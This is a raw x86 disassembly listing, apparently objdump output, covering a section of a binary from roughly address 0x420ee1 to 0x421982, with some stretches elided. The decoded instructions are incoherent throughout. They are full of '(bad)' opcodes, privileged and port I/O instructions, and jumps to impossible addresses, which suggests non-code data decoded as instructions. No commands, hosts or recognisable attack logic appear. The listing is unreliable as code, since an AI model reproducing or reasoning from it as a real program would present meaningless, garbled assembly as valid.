  420ee1:	cmp    eax,0xe580cac8
  420ee6:	sbb    eax,0xcdff015f
  420eeb:	les    edi,FWORD PTR [esi]
  420eed:	outs   dx,BYTE PTR ds:[esi]
  420eee:	enter  0x57f0,0x3
  420ef2:	cwde   
  420ef3:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  420ef5:	mov    al,0x49
  420ef7:	int3   
  420ef8:	data16 (bad) 
  420efb:	imul   edi,DWORD PTR [ebp+0x7f],0xb94bfeee
  420f02:	inc    ebp
  420f03:	jns    0x420f7a
  420f05:	ds stos DWORD PTR es:[edi],eax
  420f07:	fldenv [ecx-0x40]
  420f0a:	push   cs
  420f0b:	dec    ebp
  420f0c:	rol    BYTE PTR [eax],cl
  420f0e:	hlt    
  420f0f:	and    dh,bl
  420f11:	inc    edx
  420f12:	repnz mov ds:0x52ccc9a,eax
  420f18:	lahf   
  420f19:	add    edx,DWORD PTR [eax-0x6713d434]
  420f1f:	or     BYTE PTR [esi],dl
  420f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f22:	adc    DWORD PTR [ecx+0xa88fdd1],esi
  420f28:	xor    eax,edx
  420f2a:	pop    ds
  420f2b:	es pop ebx
  420f2d:	and    BYTE PTR [ecx+0x30],0x93
  420f31:	jle    0x420f32
  420f33:	and    DWORD PTR [ecx+0x53],ebp
  420f36:	fucompp 
  420f39:	pop    eax
  420f3a:	call   eax
  420f3c:	jp     0x420f3e
  420f3e:	ja     0x420f2e
  420f40:	jnp    0x420ece
  420f42:	ins    BYTE PTR es:[edi],dx
  420f43:	xor    DWORD PTR [eax],edx
  420f45:	xlat   BYTE PTR ds:[ebx]
  420f46:	mov    esp,0xf86ee34a
  420f4b:	cmp    BYTE PTR [ecx],ah
  420f4d:	mov    bh,0x58
  420f4f:	fimul  WORD PTR [ebp+ebx*1-0x59d6470e]
  420f56:	adc    BYTE PTR [ebp-0x2c],dl
  420f59:	popa   
  420f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f5b:	mov    edx,0x8e174bfc
  420f60:	shr    bl,0x1d
  420f63:	mov    edx,0x485330a5
  420f68:	xor    ch,bh
  420f6a:	mov    cl,0x5c
  420f6c:	cmc    
	...
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x3773bbd]
  420fe6:	fsub   QWORD PTR [ecx+0x1]
  420fe9:	add    bh,bh
  420feb:	add    BYTE PTR [eax],al
  420fed:	add    BYTE PTR [ecx-0x1f2bc83c],dh
  420ff3:	jmp    0xedd82f91
  420ff8:	fbstp  TBYTE PTR [edx+0x7ae8a0f9]
  420ffe:	xor    edi,eax
  421000:	fidiv  DWORD PTR [esi]
  421002:	loop   0x421016
  421004:	not    BYTE PTR [edx]
  421006:	das    
  421007:	arpl   WORD PTR [ecx],bx
  421009:	into   
  42100a:	das    
  42100b:	sub    al,0xad
  42100d:	in     eax,0xa4
  42100f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421010:	cmp    ecx,DWORD PTR [ebx+0x787bbaf8]
  421016:	cmp    BYTE PTR [ecx],0xee
  421019:	pop    eax
  42101a:	into   
  42101b:	shr    DWORD PTR [eax-0x5b],cl
  42101e:	test   DWORD PTR [ecx+edi*8-0x20756aec],edi
  421025:	es jo  0x420fb7
  421028:	mul    DWORD PTR [ebp+0x2a04c8c8]
  42102e:	cmp    BYTE PTR [ebx+0x5bd9b8e0],dl
  421034:	sbb    DWORD PTR [edx+0x38],0x1ed27f97
  42103b:	ret    0xa8
  42103e:	and    esi,ebx
  421040:	inc    ebp
  421041:	aas    
  421042:	pusha  
  421043:	outs   dx,BYTE PTR ds:[esi]
  421044:	sub    BYTE PTR [ebx+0x7e],ah
  421047:	repz inc esp
  421049:	mov    ah,0xaf
  42104b:	shr    BYTE PTR [ebx-0x6],1
  42104e:	mov    bl,0x5c
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	xchg   ebp,eax
  421052:	lods   eax,DWORD PTR ds:[esi]
  421053:	imul   DWORD PTR [edi+edx*4+0x363fef3c]
  42105a:	fadd   DWORD PTR [eax]
  42105c:	mov    ch,0x48
  42105e:	push   0xffffffd9
  421060:	jb     0x421015
  421062:	mov    dl,0x78
  421064:	aaa    
  421065:	or     al,0x7c
  421067:	in     al,0xce
  421069:	(bad)  
  42106a:	icebp  
  42106b:	push   ecx
  42106c:	sbb    DWORD PTR [edi+0x41],ecx
  42106f:	push   cs
  421070:	push   0xfffffff9
  421072:	xchg   ecx,eax
  421073:	pop    ebp
  421074:	std    
  421075:	fdiv   st,st(7)
  421077:	dec    edx
  421078:	ret    0x57d8
  42107b:	mov    al,0x71
  42107d:	stc    
  42107e:	mov    dh,0x20
  421080:	daa    
  421081:	(bad)  
  421082:	(bad)  
  421083:	jp     0x42102e
  421085:	fs (bad) 
  421087:	in     eax,0xd3
  421089:	addr16 out dx,eax
  42108b:	xor    esi,esi
  42108d:	rol    BYTE PTR [eax],1
  42108f:	sti    
  421090:	std    
  421091:	cmp    DWORD PTR [esi+ebp*4],0x24
  421095:	shl    BYTE PTR [eax],1
  421097:	test   eax,0x5228f361
  42109c:	xchg   ecx,eax
  42109d:	dec    ebp
  42109e:	lock mov DWORD PTR [esi-0x17],eax
  4210a2:	lods   eax,DWORD PTR ds:[esi]
  4210a3:	push   0x82e92b1
  4210a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210a9:	retf   
  4210aa:	(bad)  
  4210ab:	sbb    ecx,edi
  4210ad:	add    al,0xdf
  4210af:	mov    eax,ds:0x41452bfb
  4210b4:	inc    esp
  4210b5:	xor    BYTE PTR [ebx-0x715932b8],dh
  4210bb:	cli    
  4210bc:	ret    
  4210bd:	call   ebx
  4210bf:	inc    ebp
  4210c0:	outs   dx,DWORD PTR ds:[esi]
  4210c1:	loopne 0x42109c
  4210c3:	jne    0x421066
  4210c5:	xor    DWORD PTR [ebp-0x55],ebx
  4210c8:	sbb    al,0x44
  4210ca:	fdiv   DWORD PTR [ebp+ebx*8-0x42f68744]
  4210d1:	sbb    BYTE PTR [eax+0x59],dl
  4210d4:	repz xchg ebp,eax
  4210d6:	xchg   edx,eax
  4210d7:	inc    eax
  4210d8:	pushf  
  4210d9:	mov    ch,0x94
  4210db:	mov    ebx,0x34aa6088
  4210e0:	xchg   edi,eax
  4210e1:	push   0xdd5f88af
  4210e6:	pop    ebx
  4210e7:	jae    0x421150
  4210e9:	mov    DWORD PTR [eax],ebp
  4210eb:	icebp  
  4210ec:	cmp    al,BYTE PTR [eax]
	...
  421156:	lahf   
  421157:	pop    esi
  421158:	fcmovb st,st(6)
  42115a:	fcmovnb st,st(6)
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    ?,WORD PTR [eax-0x7b]
  421164:	div    BYTE PTR [eax+0x162db]
  42116a:	inc    DWORD PTR [eax]
  42116c:	add    BYTE PTR [eax],al
  42116e:	sub    DWORD PTR [edx+eiz*8-0x34],0xffffffb9
  421173:	jns    0x4211de
  421175:	out    dx,al
  421176:	lea    ebx,[eax-0x16b18312]
  42117c:	sar    ecx,0x3
  42117f:	or     BYTE PTR [edi+0x5a],ah
  421182:	fnclex 
  421184:	lds    edi,FWORD PTR ss:[edi-0x1c]
  421188:	jae    0x4211e5
  42118a:	test   BYTE PTR [ebx],0x2c
  42118d:	cmp    cl,BYTE PTR [esi+ebx*8+0x18]
  421191:	push   0x63
  421193:	cmp    al,0xf9
  421195:	jo     0x421174
  421197:	adc    al,0xad
  421199:	ret    
  42119a:	sbb    BYTE PTR [edi+0x2],ah
  42119d:	(bad)  
  42119e:	mov    ebp,0xa8f92398
  4211a3:	sbb    dl,0x2e
  4211a6:	dec    edi
  4211a7:	dec    ebx
  4211a8:	lahf   
  4211a9:	in     eax,dx
  4211aa:	cmc    
  4211ab:	dec    esp
  4211ac:	imul   ebx,DWORD PTR [ecx*4-0x344ac500],0x77
  4211b4:	inc    esi
  4211b5:	and    eax,0x5516d427
  4211ba:	mul    DWORD PTR [esp+ecx*8]
  4211bd:	int3   
  4211be:	xchg   eax,esi
  4211c0:	retf   
  4211c1:	ret    0x96f7
  4211c4:	(bad)  
  4211c6:	or     ecx,DWORD PTR [ebp-0x15bc4b92]
  4211cc:	xchg   DWORD PTR [eax],ecx
  4211ce:	mov    eax,0x6c84048c
  4211d3:	or     eax,edx
  4211d5:	or     al,0xba
  4211d7:	(bad)  
  4211d8:	fwait
  4211d9:	mov    al,ds:0x7a4ceacf
  4211de:	push   ebx
  4211df:	jb     0x42124c
  4211e1:	inc    edi
  4211e2:	push   ds
  4211e3:	xchg   edi,eax
  4211e4:	fcmovnbe st,st(6)
  4211e6:	xor    eax,0x625ed7f6
  4211eb:	icebp  
  4211ec:	fmul   DWORD PTR [ebx+ebx*4]
  4211ef:	ja     0x4211b9
  4211f1:	loop   0x4211e8
  4211f3:	or     eax,0xb8b6ac0f
  4211f8:	push   esp
  4211f9:	adc    esp,DWORD PTR [eax-0x19]
  4211fc:	in     al,0x95
  4211fe:	xor    eax,0x79fc954d
  421203:	cmp    al,0xa3
  421205:	(bad)  [ecx+0x26d23194]
  42120b:	jns    0x42127f
  42120d:	dec    esi
  42120e:	inc    eax
  42120f:	and    BYTE PTR [esi],dh
  421211:	lahf   
  421212:	or     eax,0x55fb712
  421217:	arpl   WORD PTR [edi+0x53cbb2d0],bp
  42121d:	xchg   ebp,eax
  42121e:	push   edi
  42121f:	(bad)  
  421221:	mov    eax,ds:0xcfb2dfbd
  421226:	dec    edx
  421227:	mov    bl,0x22
  421229:	aaa    
  42122a:	ret    
  42122b:	adc    eax,0xc7ca4268
  421230:	fdiv   DWORD PTR [edi-0x33]
  421233:	xchg   esi,eax
  421234:	daa    
  421235:	lahf   
  421236:	pushf  
  421237:	sub    DWORD PTR [ebx-0x3e672645],eax
  42123d:	dec    esp
  42123e:	jmp    0xee60206e
  421243:	mov    ah,BYTE PTR [ebp+0x3d9f67e8]
  421249:	cwde   
  42124a:	repz sub eax,0xd7c3b839
  421250:	pop    eax
  421251:	push   esi
  421252:	xor    al,BYTE PTR [ebx]
  421254:	mov    dh,0x7e
  421256:	sub    al,0x7b
  421258:	jmp    0x2d92:0xce501be3
  42125f:	sbb    al,0x69
  421261:	jae    0x421213
  421263:	add    bl,0x80
  421266:	cld    
  421267:	push   0x3d
  421269:	dec    ebx
  42126a:	scas   al,BYTE PTR es:[edi]
  42126b:	jbe    0x4212b0
	...
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0xa42e7ab3
  4212e4:	ds loope 0x4212c1
  4212e7:	arpl   WORD PTR [ecx],ax
  4212e9:	add    bh,bh
  4212eb:	add    BYTE PTR [eax],al
  4212ed:	add    BYTE PTR [eax-0x3a],cl
  4212f0:	push   cs
  4212f1:	add    eax,0x224a1561
  4212f6:	aas    
  4212f7:	ja     0x4212d7
  4212f9:	ret    0x8134
  4212fc:	jp     0x42134e
  4212fe:	xor    BYTE PTR [esi+0x54],cl
  421301:	add    ecx,esi
  421303:	dec    esp
  421304:	cld    
  421305:	or     esp,DWORD PTR [eax+0x7d7fea4f]
  42130b:	add    esi,DWORD PTR [edx]
  42130d:	mov    eax,0x43405c31
  421312:	out    dx,eax
  421313:	mov    cl,0xc2
  421315:	int3   
  421316:	popf   
  421317:	hlt    
  421318:	pop    ebp
  421319:	loopne 0x4212bc
  42131b:	sbb    bl,BYTE PTR ds:0x56782ccc
  421321:	jne    0x4212f2
  421323:	xchg   edi,eax
  421324:	pop    eax
  421325:	inc    esp
  421326:	push   ss
  421327:	imul   ecx,DWORD PTR [edx-0x412d3b77],0x8afb4843
  421331:	jno    0x421335
  421333:	cmp    BYTE PTR ds:0x65ccf17d,0x9c
  42133a:	popa   
  42133b:	cmc    
  42133c:	push   edx
  42133d:	lds    edx,FWORD PTR [ebx-0x6a]
  421340:	sti    
  421341:	push   eax
  421342:	dec    eax
  421343:	mov    dh,0xa0
  421345:	mov    gs:0x72775e4a,al
  42134b:	cs in  al,0xd5
  42134e:	scas   eax,DWORD PTR es:[edi]
  42134f:	xor    eax,0xae17d04f
  421354:	inc    esp
  421355:	imul   esi,DWORD PTR [ebx-0x1e],0x48
  421359:	ss inc edx
  42135b:	stos   BYTE PTR es:[edi],al
  42135c:	pushf  
  42135d:	loop   0x421327
  42135f:	add    eax,0x4118cdef
  421364:	mov    esi,0xc16ef4cc
  421369:	(bad)  
  42136a:	sar    DWORD PTR [edi],0x2
  42136d:	pop    edi
  42136e:	or     al,0x8e
  421370:	cwde   
  421371:	mov    cl,BYTE PTR [ecx+edx*8]
  421374:	and    BYTE PTR [eax],dl
  421376:	or     BYTE PTR [eax+0xd4a320a],al
  42137c:	pushf  
  42137d:	out    dx,eax
  42137e:	jmp    0x2ba5:0xbdcd8e38
  421385:	(bad)  
  421386:	test   eax,0x348ede46
  42138b:	ret    0xe532
  42138e:	adc    eax,0x35f3399c
  421393:	jns    0x4213f5
  421395:	jae    0x421344
  421397:	pushf  
  421398:	cmp    eax,0xba045b96
  42139d:	adc    ah,BYTE PTR [edx]
  42139f:	or     BYTE PTR [ecx-0x314b38c3],0x67
  4213a6:	add    ch,ah
  4213a8:	jae    0x421343
  4213aa:	cmp    DWORD PTR [eax],0x4
  4213ad:	repz sub ah,BYTE PTR [ecx+0x59]
  4213b1:	push   ebp
  4213b2:	pop    ebx
  4213b3:	(bad)  
  4213b5:	jl     0x4213b9
  4213b7:	stos   BYTE PTR es:[edi],al
  4213b8:	adc    BYTE PTR [esi+0x7aa770dd],bl
  4213be:	jmp    0x21463878
  4213c3:	imul   esp,DWORD PTR [esp+ebx*8],0xfd8cb710
  4213ca:	push   0x972a059b
  4213cf:	push   0xb32ddeb6
  4213d4:	inc    esi
  4213d5:	push   ebx
  4213d6:	loop   0x4213ee
  4213d8:	sahf   
  4213d9:	cmp    ah,BYTE PTR [ebx+0x659d3d0c]
  4213df:	sbb    DWORD PTR [ebx+0x2b],ebp
  4213e2:	sbb    edi,DWORD PTR [esi-0x3db11ad1]
  4213e8:	mov    ah,BYTE PTR [ecx+0xd1c377]
	...
  421456:	inc    bh
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp-0x1f180b61]
  421464:	fadd   DWORD PTR [ebx+0x164d9]
  42146a:	inc    DWORD PTR [eax]
  42146c:	add    BYTE PTR [eax],al
  42146e:	dec    ecx
  42146f:	les    edi,FWORD PTR [ecx-0x2d064c06]
  421475:	jo     0x4214f2
  421477:	sbb    DWORD PTR [edi-0x31],edi
  42147a:	inc    eax
  42147b:	mov    dh,0x36
  42147d:	fidiv  DWORD PTR [ecx-0x7b]
  421480:	sbb    DWORD PTR [edi+edx*2-0x6874c9c1],edi
  421487:	jo     0x42146d
  421489:	add    ebx,DWORD PTR [edi]
  42148b:	das    
  42148c:	cmp    al,0xed
  42148e:	iret   
  42148f:	ins    DWORD PTR es:[edi],dx
  421490:	cmp    eax,0xe5344d61
  421495:	or     eax,0x90183aa9
  42149a:	sub    dh,BYTE PTR [ebx+0x6f]
  42149d:	sub    ch,BYTE PTR [edi-0x5d562176]
  4214a3:	lds    edi,FWORD PTR [esi]
  4214a5:	hlt    
  4214a6:	adc    al,dl
  4214a8:	pop    edi
  4214a9:	out    0x79,al
  4214ab:	add    eax,DWORD PTR [esi]
  4214ad:	adc    ebx,DWORD PTR [ebp-0x72]
  4214b0:	iret   
  4214b1:	retf   
  4214b2:	and    cl,dh
  4214b4:	xlat   BYTE PTR ds:[ebx]
  4214b5:	push   ss
  4214b6:	rcl    DWORD PTR [edi+0x1f90896],0x44
  4214bd:	sub    eax,0x8b36267e
  4214c2:	sti    
  4214c3:	push   esi
  4214c5:	pop    edx
  4214c6:	out    dx,eax
  4214c7:	leave  
  4214c8:	fnstenv [edi-0x2b]
  4214cb:	xor    al,0xf3
  4214cd:	sti    
  4214ce:	ret    
  4214cf:	cs jmp 0xf2ba:0xbf44a3b4
  4214d7:	imul   DWORD PTR [edi+0x72]
  4214da:	pop    eax
  4214db:	fcmovne st,st(7)
  4214dd:	mov    al,0x44
  4214df:	daa    
  4214e0:	mov    ebx,0x26f59903
  4214e5:	cs push ebx
  4214e7:	jne    0x421504
  4214e9:	pop    edi
  4214ea:	test   eax,0x7c08ba5c
  4214ef:	push   ebp
  4214f0:	retf   0xfd12
  4214f3:	add    eax,0xb7d08384
  4214f8:	stc    
  4214f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214fa:	arpl   WORD PTR [ebx],bx
  4214fc:	and    eax,eax
  4214fe:	test   eax,0xd492301
  421503:	ret    
  421504:	dec    edi
  421505:	push   ebp
  421506:	ins    DWORD PTR es:[edi],dx
  421507:	dec    ebx
  421508:	xchg   edi,eax
  421509:	xor    eax,0x80bc598a
  42150e:	mov    dh,dh
  421510:	sbb    esp,DWORD PTR [eax+ebp*1]
  421513:	add    dh,BYTE PTR [ebx-0x4f]
  421516:	ss neg ch
  421519:	mov    DWORD PTR [ebx-0x79154da4],edx
  42151f:	stos   BYTE PTR es:[edi],al
  421520:	fbstp  TBYTE PTR [esi]
  421522:	and    al,0x65
  421524:	icebp  
  421525:	add    DWORD PTR [edx],esp
  421527:	or     DWORD PTR [edx-0x64],edi
  42152a:	clc    
  42152b:	add    bl,dh
  42152d:	lods   al,BYTE PTR ds:[esi]
  42152e:	push   ebx
  42152f:	mov    esp,0xc34f1cf3
  421534:	into   
  421535:	jp     0x42158a
  421537:	pop    esp
  421538:	add    DWORD PTR [esi-0x1f],ecx
  42153b:	mov    DWORD PTR [edx+0x125d7f4],edi
  421541:	ins    DWORD PTR es:[edi],dx
  421542:	add    cl,BYTE PTR [edx+0x51ac838f]
  421548:	jbe    0x42153c
  42154a:	nop
  42154b:	and    BYTE PTR [esi+0x48],dh
  42154e:	call   0x4bf6:0x4250e06a
  421555:	and    eax,0xce8778bf
  42155a:	push   ecx
  42155b:	call   DWORD PTR [edx-0x428a774d]
  421561:	push   ebx
  421562:	dec    ecx
  421563:	rol    BYTE PTR ds:0x10028037,0xd2
  42156a:	jae    0x42156d
  42156c:	xchg   DWORD PTR [eax],eax
	...
  4215d6:	(bad)  
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x6a0142b4],bp
  4215e4:	sbb    ebx,edi
  4215e6:	fsub   DWORD PTR [ebp+0x1]
  4215e9:	add    bh,bh
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [ebx-0x1a095bd4],bl
  4215f3:	(bad)  
  4215f4:	enter  0x5e0c,0x57
  4215f8:	sub    DWORD PTR [esp+edx*2-0x535d4106],ebp
  4215ff:	aad    0xc1
  421601:	xor    eax,0x2124621c
  421606:	dec    ebp
  421607:	imul   eax,ecx,0x76
  42160a:	pusha  
  42160b:	pop    esi
  42160c:	aad    0x6f
  42160e:	std    
  42160f:	add    eax,0xfeb5fc40
  421614:	enter  0xef79,0x19
  421618:	jmp    0x421646
  42161a:	loopne 0x42162e
  42161c:	mov    ds:0x1bae4dce,al
  421621:	retf   0x74e7
  421624:	mov    dl,0x14
  421626:	mov    cl,0x95
  421628:	mov    eax,0x1ba0ebc2
  42162d:	sahf   
  42162e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42162f:	or     DWORD PTR [edx+0x58],ecx
  421632:	aaa    
  421633:	pop    esi
  421634:	cmp    BYTE PTR [ebx],al
  421636:	add    BYTE PTR [edx-0x72],0x53
  42163a:	out    dx,eax
  42163b:	fild   QWORD PTR ds:0x5188f464
  421641:	pusha  
  421642:	sbb    eax,0x9bab1549
  421647:	fidivr WORD PTR [edi]
  421649:	test   eax,0x6042856b
  42164e:	inc    ebp
  42164f:	push   ss
  421650:	xchg   esi,eax
  421651:	dec    esi
  421652:	xor    ch,BYTE PTR [ebx-0x11]
  421655:	xor    bh,BYTE PTR [ecx+0x37]
  421658:	call   0xcd96bf8b
  42165d:	aaa    
  42165e:	push   ss
  42165f:	push   ebp
  421660:	fucomip st,st(0)
  421662:	sbb    DWORD PTR ds:0xc1c10415,ebp
  421668:	and    dh,bh
  42166a:	retf   0x5640
  42166d:	dec    ebx
  42166e:	jnp    0x421610
  421670:	xor    DWORD PTR es:[esi-0x41],edi
  421674:	ficom  DWORD PTR [edx-0x38887e86]
  42167a:	(bad)  
  42167b:	sbb    al,0x18
  42167d:	jb     0x42165e
  42167f:	inc    ebp
  421680:	adc    BYTE PTR [ecx],ch
  421682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421683:	cmc    
  421684:	dec    esi
  421685:	cdq    
  421686:	ja     0x4216eb
  421688:	sar    ah,cl
  42168a:	pop    ds
  42168b:	es int 0x8
  42168e:	out    0x35,al
  421690:	push   ds
  421691:	retf   0xee33
  421694:	hlt    
  421695:	(bad)  
  421696:	stos   BYTE PTR es:[edi],al
  421697:	pop    esp
  421698:	pop    ss
  421699:	xchg   esp,eax
  42169a:	mov    esp,0xd815638c
  42169f:	xchg   ebp,eax
  4216a0:	ja     0x421635
  4216a2:	mov    edx,0x807e9a63
  4216a7:	int3   
  4216a8:	pop    edx
  4216a9:	(bad)  
  4216ab:	iret   
  4216ac:	inc    ebp
  4216ad:	mov    bh,0x51
  4216af:	sub    ebx,edx
  4216b1:	(bad)  
  4216b2:	jb     0x4216d4
  4216b4:	mov    BYTE PTR [ebp+0x776d5731],dl
  4216ba:	inc    di
  4216bc:	xchg   ebp,eax
  4216bd:	dec    esp
  4216be:	imul   ebx,DWORD PTR [esi],0xffffff9f
  4216c1:	ss in  al,0x6d
  4216c4:	arpl   WORD PTR [edx+esi*2],si
  4216c7:	sbb    DWORD PTR [edx-0x281a9a95],ecx
  4216cd:	pop    esi
  4216ce:	je     0x42165e
  4216d0:	pop    ss
  4216d1:	out    dx,eax
  4216d2:	ficomp WORD PTR [ebx]
  4216d4:	sub    DWORD PTR [ebx+0x18f546a5],ecx
  4216da:	or     al,0xb4
  4216dc:	hlt    
  4216dd:	imul   BYTE PTR [eax+0x56c782da]
  4216e3:	(bad)  
  4216e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216e6:	xlat   BYTE PTR ds:[ebx]
  4216e7:	pop    edi
  4216e8:	call   0x37db0126
	...
  421755:	add    BYTE PTR [ebx-0x105512d4],ch
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	push   edi
  421763:	fld    TBYTE PTR [ebp+0x166d7a5]
  421769:	add    bh,bh
  42176b:	add    BYTE PTR [eax],al
  42176d:	add    BYTE PTR [ecx],ah
  42176f:	adc    al,0x2
  421771:	cld    
  421772:	stos   BYTE PTR es:[edi],al
  421773:	dec    esi
  421774:	mov    bh,0x98
  421776:	pop    ecx
  421777:	in     eax,0xc7
  421779:	and    al,0xe4
  42177b:	(bad)  
  42177c:	ror    DWORD PTR [esi-0x761db7bf],1
  421782:	stos   DWORD PTR es:[edi],eax
  421783:	or     al,0xdc
  421785:	in     al,dx
  421786:	jmp    FWORD PTR [ecx+0x38]
  421789:	or     al,0x2d
  42178b:	adc    BYTE PTR [ecx],ah
  42178d:	lock imul BYTE PTR [esi+edi*4-0x59]
  421792:	test   DWORD PTR [ebx+0x21],esi
  421795:	cmp    al,0x1c
  421797:	inc    ebx
  421798:	cwde   
  421799:	aas    
  42179a:	xor    eax,0xc5b93ca9
  42179f:	mov    edx,0x36fbffea
  4217a4:	jb     0x421787
  4217a6:	repz mov ds:0xbc7d863c,eax
  4217ac:	rol    DWORD PTR [ebx+ebx*8+0x4905be88],cl
  4217b3:	mov    ebp,0xcd0c4f6f
  4217b8:	retf   0x8830
  4217bb:	data16 xor al,0x74
  4217be:	cmp    DWORD PTR [ecx-0x604bc41],esp
  4217c4:	sbb    dh,BYTE PTR [esi+eax*1+0x686cde82]
  4217cb:	and    DWORD PTR [eax],0x7e
  4217ce:	data16 fistp WORD PTR [ecx+0x1c6b8e5f]
  4217d5:	es pop ecx
  4217d8:	shl    BYTE PTR [edx+0x74],1
  4217db:	arpl   WORD PTR [ecx-0x30219df3],bp
  4217e1:	dec    esi
  4217e2:	add    ebx,ecx
  4217e4:	mov    ah,0x9d
  4217e6:	add    eax,0x9ae657f4
  4217eb:	fxch   st(3)
  4217ed:	int3   
  4217ee:	ins    DWORD PTR es:[edi],dx
  4217ef:	dec    ecx
  4217f0:	fwait
  4217f1:	scas   eax,DWORD PTR es:[edi]
  4217f2:	mov    bh,0xfb
  4217f4:	fnstcw WORD PTR [ebx]
  4217f6:	sub    eax,0xb3cb81cf
  4217fb:	mov    cl,BYTE PTR [eax+0x32]
  4217fe:	out    dx,eax
  4217ff:	inc    ebp
  421800:	lds    edx,FWORD PTR [ecx+0x78978814]
  421806:	xor    ebx,eax
  421808:	pop    esi
  421809:	daa    
  42180a:	jnp    0x42184f
  42180c:	dec    esi
  42180d:	inc    esi
  42180e:	in     eax,0xf1
  421810:	pop    ebp
  421811:	shr    BYTE PTR [ebp-0x4f47f4e],0xda
  421818:	test   al,0x7c
  42181a:	dec    edx
  42181b:	aaa    
  42181c:	xchg   ebx,eax
  42181d:	jbe    0x42189c
  42181f:	mov    bh,0x18
  421821:	sub    BYTE PTR [edx+eax*2-0x67],bl
  421825:	addr16 imul ebp,eax,0xa101be20
  42182c:	add    ecx,ebp
  42182e:	push   ecx
  42182f:	or     ebp,edi
  421831:	and    BYTE PTR [edx+0x4c],al
  421834:	stos   DWORD PTR es:[edi],eax
  421835:	(bad)  
  421837:	lea    ebx,[eax-0x17f9e504]
  42183d:	sbb    ah,BYTE PTR [edx+ebp*1+0x7d90a302]
  421844:	lods   al,BYTE PTR ds:[esi]
  421845:	scas   eax,DWORD PTR es:[edi]
  421846:	pop    ebp
  421847:	adc    al,0x86
  421849:	mov    BYTE PTR [edi-0x77],bh
  42184c:	(bad)  
  42184d:	lea    esp,[ebp+0x3b]
  421850:	inc    ebp
  421851:	push   eax
  421852:	cli    
  421853:	out    0x76,al
  421855:	aaa    
  421856:	and    al,0xe
  421858:	scas   al,BYTE PTR es:[edi]
  421859:	shl    edi,0x6e
  42185c:	(bad)  
  42185d:	cwde   
  42185e:	mov    ds:0xa0e03aaf,al
  421863:	sub    cl,BYTE PTR [eax+0x12]
  421866:	inc    ebp
  421867:	test   al,0xd6
  421869:	pop    ds
  42186a:	mov    ds:0xc58c,eax
	...
  4218d3:	add    BYTE PTR [eax],al
  4218d5:	add    cl,dl
  4218d7:	mov    al,ds:0xf9f9e0b9
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	sub    al,0x83
  4218e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218e5:	ins    DWORD PTR es:[edi],dx
  4218e6:	(bad)  
  4218e7:	add    DWORD PTR [bx+si],eax
  4218ea:	inc    DWORD PTR [eax]
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	and    ebx,DWORD PTR [edi+0x3d]
  4218f1:	mul    DWORD PTR [eax+edi*2-0x72]
  4218f5:	jae    0x4218db
  4218f7:	les    ebp,FWORD PTR [esi+0x61]
  4218fa:	and    ch,BYTE PTR [esi-0x40b0a59e]
  421900:	loopne 0x4218bc
  421902:	xlat   BYTE PTR ds:[ebx]
  421903:	fucomi st,st(6)
  421905:	jmp    0x84eaaf2c
  42190a:	imul   eax,DWORD PTR [eax-0x23],0x52
  42190e:	(bad)  [ebp-0x48]
  421911:	(bad)  
  421912:	jg     0x421919
  421914:	jb     0x421955
  421916:	jbe    0x4218bb
  421918:	dec    edx
  421919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42191a:	mul    BYTE PTR [eax-0x682ade54]
  421920:	push   eax
  421921:	cmp    al,0x1b
  421923:	(bad)  
  421924:	mov    ds:0xc4d5b155,eax
  421929:	sti    
  42192a:	popa   
  42192b:	imul   edx,DWORD PTR [ecx+ebp*2+0x7],0x99e3d06
  421933:	mov    bl,0x3e
  421935:	cmp    eax,0x3143f250
  42193a:	pop    es
  42193b:	enter  0x6e35,0xc6
  42193f:	imul   ecx,DWORD PTR [ecx+0xf],0xffffffab
  421943:	mov    cl,0x48
  421945:	outs   dx,BYTE PTR ds:[esi]
  421946:	and    eax,0x80006af
  42194b:	inc    edx
  42194c:	pushf  
  42194d:	ins    DWORD PTR es:[edi],dx
  42194e:	cmp    al,0x46
  421950:	dec    edi
  421951:	in     al,0xba
  421953:	gs jmp 0x3518:0xa1456108
  42195b:	or     al,0x14
  42195d:	sti    
  42195e:	mov    esi,0x69cd6d49
  421963:	shr    DWORD PTR [ecx],0xff
  421966:	in     al,0x8e
  421968:	push   ds
  421969:	push   eax
  42196a:	dec    edi
  42196b:	in     al,dx
  42196c:	xchg   edx,eax
  42196d:	cmp    eax,0x14a650ae
  421972:	bound  ecx,QWORD PTR [ecx+eax*2]
  421975:	out    0xcb,eax
  421977:	in     eax,dx
  421978:	sti    
  421979:	push   0x5d3d777e
  42197e:	ins    BYTE PTR es:[edi],dx
  42197f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421980:	popf   
  421981:	das    
  421982:	fnstcw WORD PTR [edi+ebx*4+0x34]
